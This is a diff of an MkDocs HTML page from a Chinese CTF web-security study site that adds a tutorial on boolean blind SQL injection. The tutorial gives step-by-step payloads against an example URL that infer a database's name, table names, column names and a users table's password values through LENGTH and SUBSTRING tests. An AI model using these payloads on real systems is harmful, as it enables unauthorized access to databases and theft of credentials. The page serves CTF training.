@@ -4,27 +4,27 @@
         <meta charset="utf-8">
         <meta http-equiv="X-UA-Compatible" content="IE=edge">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <meta name="description" content="None">
         
         
-        <link rel="shortcut icon" href="img/favicon.ico">
-        <title>CTF-WEB</title>
-        <link href="css/bootstrap.min.css" rel="stylesheet">
-        <link href="css/fontawesome.min.css" rel="stylesheet">
-        <link href="css/brands.min.css" rel="stylesheet">
-        <link href="css/solid.min.css" rel="stylesheet">
-        <link href="css/v4-font-face.min.css" rel="stylesheet">
-        <link href="css/base.css" rel="stylesheet">
+        
+        <link rel="shortcut icon" href="../img/favicon.ico">
+        <title>SQL 4 bool盲注思路 - CTF-WEB</title>
+        <link href="../css/bootstrap.min.css" rel="stylesheet">
+        <link href="../css/fontawesome.min.css" rel="stylesheet">
+        <link href="../css/brands.min.css" rel="stylesheet">
+        <link href="../css/solid.min.css" rel="stylesheet">
+        <link href="../css/v4-font-face.min.css" rel="stylesheet">
+        <link href="../css/base.css" rel="stylesheet">
         <link id="hljs-light" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/github.min.css" >
         <link id="hljs-dark" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/github-dark.min.css" disabled>
         <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>
         <script>hljs.highlightAll();</script> 
     </head>
 
-    <body class="homepage">
+    <body>
         <div class="navbar fixed-top navbar-expand-lg navbar-dark bg-primary">
             <div class="container">
-                <a class="navbar-brand" href=".">CTF-WEB</a>
+                <a class="navbar-brand" href="..">CTF-WEB</a>
                 <!-- Expander button -->
                 <button type="button" class="navbar-toggler" data-bs-toggle="collapse" data-bs-target="#navbar-collapse" aria-controls="navbar-collapse" aria-expanded="false" aria-label="Toggle navigation">
                     <span class="navbar-toggler-icon"></span>
@@ -35,22 +35,22 @@
                         <!-- Main navigation -->
                         <ul class="nav navbar-nav">
                             <li class="nav-item">
-                                <a href="." class="nav-link active" aria-current="page">Home</a>
+                                <a href=".." class="nav-link">Home</a>
                             </li>
                             <li class="nav-item">
-                                <a href="SQL-1-%E6%B3%A8%E5%85%A5%E4%B8%AD%E7%9A%84%E5%87%A0%E4%B8%AA%E5%85%B3%E9%94%AE%E8%AF%8D/" class="nav-link">SQL 1 注入中的几个关键词</a>
+                                <a href="../SQL-1-%E6%B3%A8%E5%85%A5%E4%B8%AD%E7%9A%84%E5%87%A0%E4%B8%AA%E5%85%B3%E9%94%AE%E8%AF%8D/" class="nav-link">SQL 1 注入中的几个关键词</a>
                             </li>
                             <li class="nav-item">
-                                <a href="SQL-2-information_schema%E5%88%A9%E7%94%A8/" class="nav-link">SQL 2 information schema利用</a>
+                                <a href="../SQL-2-information_schema%E5%88%A9%E7%94%A8/" class="nav-link">SQL 2 information schema利用</a>
                             </li>
                             <li class="nav-item">
-                                <a href="SQL-3-%E6%99%AE%E9%80%9A%E6%B3%A8%E5%85%A5/" class="nav-link">SQL 3 普通注入</a>
+                                <a href="../SQL-3-%E6%99%AE%E9%80%9A%E6%B3%A8%E5%85%A5/" class="nav-link">SQL 3 普通注入</a>
                             </li>
                             <li class="nav-item">
-                                <a href="SQL-4-bool%E7%9B%B2%E6%B3%A8%E6%80%9D%E8%B7%AF/" class="nav-link">SQL 4 bool盲注思路</a>
+                                <a href="./" class="nav-link active" aria-current="page">SQL 4 bool盲注思路</a>
                             </li>
                             <li class="nav-item">
-                                <a href="SQL-5-bool%E7%9B%B2%E6%B3%A8%E9%80%BB%E8%BE%91%E5%8F%82%E8%80%83/" class="nav-link">SQL 5 bool盲注逻辑参考</a>
+                                <a href="../SQL-5-bool%E7%9B%B2%E6%B3%A8%E9%80%BB%E8%BE%91%E5%8F%82%E8%80%83/" class="nav-link">SQL 5 bool盲注逻辑参考</a>
                             </li>
                         </ul>
 
@@ -61,12 +61,12 @@
                             </a>
                         </li>
                             <li class="nav-item">
-                                <a rel="prev" class="nav-link disabled">
+                                <a rel="prev" href="../SQL-3-%E6%99%AE%E9%80%9A%E6%B3%A8%E5%85%A5/" class="nav-link">
                                     <i class="fa fa-arrow-left"></i> Previous
                                 </a>
                             </li>
                             <li class="nav-item">
-                                <a rel="next" href="SQL-1-%E6%B3%A8%E5%85%A5%E4%B8%AD%E7%9A%84%E5%87%A0%E4%B8%AA%E5%85%B3%E9%94%AE%E8%AF%8D/" class="nav-link">
+                                <a rel="next" href="../SQL-5-bool%E7%9B%B2%E6%B3%A8%E9%80%BB%E8%BE%91%E5%8F%82%E8%80%83/" class="nav-link">
                                     Next <i class="fa fa-arrow-right"></i>
                                 </a>
                             </li>
@@ -88,28 +88,110 @@
     <div id="toc-collapse" class="navbar-collapse collapse card bg-body-tertiary">
         <ul class="nav flex-column">
             
-            
         </ul>
     </div>
 </div></div>
                     <div class="col-md-9" role="main">
 
-<h3 id="firefox">安装 firefox 浏览器</h3>
-<p>官网：https://www.mozilla.org/en-US/firefox/new/</p>
-<p><img alt="image-20241218123839288" src="../../png/image-20241218123839288.png" /></p>
-<p>默认安装 firefox。</p>
-<h3 id="hackbar">安装 Hackbar 插件</h3>
-<p><img alt="image-20241218124040737" src="../../png/image-20241218124040737.png" /></p>
-<p><strong>输入 hackbar，按 Enter 键进行搜索</strong></p>
-<p><img alt="image-20241218124130576" src="../../png/image-20241218124130576.png" /></p>
-<p><strong>选择 HackBar V2，点击</strong></p>
-<p><img alt="image-20241218124319003" src="../../png/image-20241218124319003.png" /></p>
-<p><img alt="image-20241218124418569" src="../../png/image-20241218124418569.png" /></p>
-<p><img alt="image-20241218124519810" src="../../png/image-20241218124519810.png" /></p>
-<p>安装完成，按 F12，选择 HackBar 工具</p>
-<p><img alt="image-20241218124630209" src="../../png/image-20241218124630209.png" /></p>
-<p>点击 Load URL，可以加载当前的 url</p>
-<p>对当前的 url 进行修改，再点击 Execute可以执行修改后的 Url</p></div>
+<h3 id="_1">基本思路</h3>
+<ol>
+<li><strong>注入点检测</strong></li>
+</ol>
+<p>找到一个可以进行注入的参数位置，通常通过简单的测试 <code>1=1</code>（始终为真）和 <code>1=2</code>（始终为假）的情况观察响应的变化。例如：</p>
+<pre><code class="language-html">http://example.com/item?id=1 AND 1=1   --&gt; 页面正常显示
+http://example.com/item?id=1 AND 1=2   --&gt; 页面异常或不同
+</code></pre>
+<p>如果响应页面存在显著差异，说明该参数存在布尔盲注的可能性。</p>
+<hr />
+<ol>
+<li>
+<p><strong>推测数据结构</strong>      使用逐步的逻辑表达式查询数据库元信息：</p>
+</li>
+<li>
+<p>推测当前使用的数据库：</p>
+</li>
+</ol>
+<p><code>sql
+  id=1 AND DATABASE() LIKE 'test%'</code></p>
+<p>判断当前数据库名是否以 <code>test</code> 开头。</p>
+<ul>
+<li>获取数据库长度：</li>
+</ul>
+<p><code>sql
+  id=1 AND LENGTH(DATABASE())=4</code></p>
+<p>判断当前数据库名是否为 4 个字符 ，可以写成循环来判断。</p>
+<ul>
+<li>字符逐个推测： 假设数据库名长度为 4，逐字符尝试：</li>
+</ul>
+<p><code>sql
+  id=1 AND SUBSTRING(DATABASE(), 1, 1)='t'  --&gt; 第一个字符是否是 't'
+  id=1 AND SUBSTRING(DATABASE(), 2, 1)='e'  --&gt; 第二个字符是否是 'e'
+  id=1 AND SUBSTRING(DATABASE(), 3, 1)='s'  --&gt; 第三个字符是否是 's'
+  id=1 AND SUBSTRING(DATABASE(), 4, 1)='t'  --&gt; 第四个字符是否是 't'</code></p>
+<hr />
+<ol>
+<li>
+<p><strong>获取表名</strong>   使用 <code>information_schema.tables</code>  推测表名：</p>
+</li>
+<li>
+<p>获取表的数量：</p>
+</li>
+</ol>
+<p><code>sql
+  id=1 AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=DATABASE())=5</code></p>
+<p>判断当前数据库中是否有 5 个表，可以写成循环来判断。</p>
+<ul>
+<li>获取表名长度：</li>
+</ul>
+<p><code>sql
+  id=1 AND LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 0,1))=6</code></p>
+<p>判断第一个表的名称长度为 6，可以写成循环来判断。</p>
+<ul>
+<li>推测表名字符：</li>
+</ul>
+<p><code>sql
+  id=1 AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 0,1),1,1)='u'</code></p>
+<hr />
+<ol>
+<li><strong>获取字段名</strong></li>
+</ol>
+<p>使用 <code>information_schema.columns</code> 获取字段名：</p>
+<ul>
+<li>获取字段数量：</li>
+</ul>
+<p><code>sql
+  id=1 AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='users')=3</code></p>
+<p>判断表 <code>users</code> 中是否有 3 个字段，可以写成循环来判断。</p>
+<ul>
+<li>获取字段名长度，可以写成循环来判断：</li>
+</ul>
+<p><code>sql
+  id=1 AND LENGTH((SELECT column_name FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='users' LIMIT 0,1))=5</code></p>
+<ul>
+<li>推测字段名字符，可以写成循环来判断：</li>
+</ul>
+<p><code>sql
+  id=1 AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='users' LIMIT 0,1),1,1)='i'</code></p>
+<hr />
+<ol>
+<li><strong>获取字段值</strong></li>
+</ol>
+<p>使用逐字符猜测字段值：</p>
+<ul>
+<li>
+<p>假设字段 <code>password</code>在表<code>users</code>中：</p>
+</li>
+<li>
+<p>获取字段值长度：</p>
+<p><code>sql
+id=1 AND LENGTH((SELECT password FROM users LIMIT 0,1))=8</code></p>
+</li>
+<li>
+<p>获取字段值字符：</p>
+<p><code>sql
+id=1 AND SUBSTRING((SELECT password FROM users LIMIT 0,1),1,1)='p'</code></p>
+</li>
+</ul></div>
             </div>
         </div>
 
@@ -117,13 +199,13 @@
             <hr>
             <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a>.</p>
         </footer>
-        <script src="js/bootstrap.bundle.min.js"></script>
+        <script src="../js/bootstrap.bundle.min.js"></script>
         <script>
-            var base_url = ".",
+            var base_url = "..",
                 shortcuts = {"help": 191, "next": 78, "previous": 80, "search": 83};
         </script>
-        <script src="js/base.js"></script>
-        <script src="search/main.js"></script>
+        <script src="../js/base.js"></script>
+        <script src="../search/main.js"></script>
 
         <div class="modal" id="mkdocs_search_modal" tabindex="-1" role="dialog" aria-labelledby="searchModalLabel" aria-hidden="true">
     <div class="modal-dialog modal-lg">
@@ -188,8 +270,3 @@
 
     </body>
 </html>
-
-<!--
-MkDocs version : 1.6.1
-Build Date UTC : 2025-04-11 05:30:46.046182+00:00
--->
